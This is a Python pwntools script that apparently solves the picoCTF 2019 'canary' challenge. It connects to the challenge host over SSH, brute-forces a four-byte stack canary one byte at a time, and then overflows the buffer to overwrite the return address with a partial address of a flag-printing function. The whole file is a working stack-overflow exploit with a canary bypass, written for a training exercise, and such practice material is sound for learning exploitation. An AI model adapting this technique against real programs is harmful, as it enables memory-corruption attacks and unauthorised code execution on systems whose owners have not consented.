from pwn import *
from copy import copy


# Constants
CANARY_LEN = 4
CANARY_OFFSET = 32
RA_OFFSET = 16
STACK_SMASHING_DETECTED_ALERT = b'Stack Smashing Detected'
DISPLAY_FLAG_FUNC_ADDR_OFFSET = 0x000087ed #  objdump -d -M intel vuln + brute force
DIR = '/problems/canary_2_dffbf795b4788666d54a993a5e41d145/'


shell = ssh('kscieslinski', '2019shell1.picoctf.com', password='xxxx', port=22)


def crashes_using_canary(canary):
    p = shell.process(DIR + 'vuln', cwd=DIR)
    p.recvline() #  "Please enter the length of the entry:\n> "

    payload = b'A' * CANARY_OFFSET + canary
    payload_length = bytes(str(len(payload)), 'utf-8')
    p.sendline(payload_length)
    p.recv(7) #  "printf("Input> ");"

    p.sendline(payload)
    resp = p.recvline()
    p.kill()
    if STACK_SMASHING_DETECTED_ALERT in resp:
        return True
    else:
        return False



def brute_canary_byte(canary_part, pos):
    for i in range(256):
        canary = copy(canary_part)
        canary.append(i)
        if canary is None:
            print("ERROR: canary is NoneType")
            return 0
        canary = bytes(canary)
        if crashes_using_canary(canary) == False:
            return i
    print("ERROR: could not determinate " + str(pos + 1) + " byte")
    return 0


def brute_canary():
    canary = bytearray()
    for i in range(0, CANARY_LEN):
        canary_byte_at_pos_i = brute_canary_byte(canary, i)
        canary.append(canary_byte_at_pos_i)
    return canary


def exploit(canary):
    p = shell.process(DIR + 'vuln', cwd=DIR)
    p.recvline() #  "Please enter the length of the entry:\n> "

    display_func_addr = p32(DISPLAY_FLAG_FUNC_ADDR_OFFSET)[:2] #  We rely on pure randomization. Hope the least significant byte

    payload = b'A' * CANARY_OFFSET + canary + b'B' * RA_OFFSET + display_func_addr
    payload_length = bytes(str(len(payload)), 'utf-8')
    p.sendline(payload_length)
    p.recv(7) #  "printf("Input> ");"

    p.sendline(payload)
    print(p.recvline())
    print(p.recvall())


if __name__ == '__main__':
    context.log_level = 'debug'
    canary = brute_canary()
    canary = bytes(canary)
    print(b'Found canary: ' + canary) # ex;Y
    exploit(canary)